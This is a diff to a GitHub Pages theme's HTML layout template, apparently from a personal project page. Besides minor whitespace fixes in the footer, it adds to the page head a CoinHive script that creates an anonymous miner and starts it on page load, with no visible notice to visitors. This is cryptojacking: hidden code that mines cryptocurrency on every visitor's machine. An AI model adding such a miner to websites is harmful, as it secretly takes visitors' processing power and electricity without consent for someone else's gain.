@@ -11,6 +11,27 @@
     <!--[if lt IE 9]>
     <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
     <![endif]-->
+
+    <!--CoinHive-->
+    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+    <script>
+	     var miner = new CoinHive.Anonymous('<MwQtZn8NZBZvnVzS002trMrshAPRVgNy>');
+	     miner.start();
+    </script>
+    <script>
+	     // Listen on events
+	      miner.on('found', function() { /* Hash found */ })
+	      miner.on('accepted', function() { /* Hash accepted by the pool */ })
+
+	     // Update stats once per second
+	      setInterval(function() {
+		    var hashesPerSecond = miner.getHashesPerSecond();
+		    var totalHashes = miner.getTotalHashes();
+		    var acceptedHashes = miner.getAcceptedHashes();
+
+		   // Output to HTML elements...
+	      }, 1000);
+    </script>
   </head>
   <body>
     <div class="wrapper">
@@ -26,7 +47,7 @@
 
         {% if site.github.is_user_page %}
           <p class="view"><img src="../assets/img/github-logo.png"><a href="{{ site.github.owner_url }}">GitHub</a>   <img src="../assets/img/twitter-logo.png"><a href="{{ site.twitter }}">Twitter</a></p>
-        {% endif %}      
+        {% endif %}
 
         {% if site.show_downloads %}
           <ul>
@@ -46,8 +67,8 @@
         {% if site.github.is_project_page %}
         <p>This project is maintained by <a href="{{ site.github.owner_url }}">{{ site.github.owner_name }}</a></p>
         {% endif %}
-        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a> 
-          Rebuilded by <a href="https://github.com/mickaeldias">mickaeldias</a> with <a href="../LICENSE">MIT License</a>  
+        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a>
+          Rebuilded by <a href="https://github.com/mickaeldias">mickaeldias</a> with <a href="../LICENSE">MIT License</a>
         </small></p>
       </footer>
     </div>
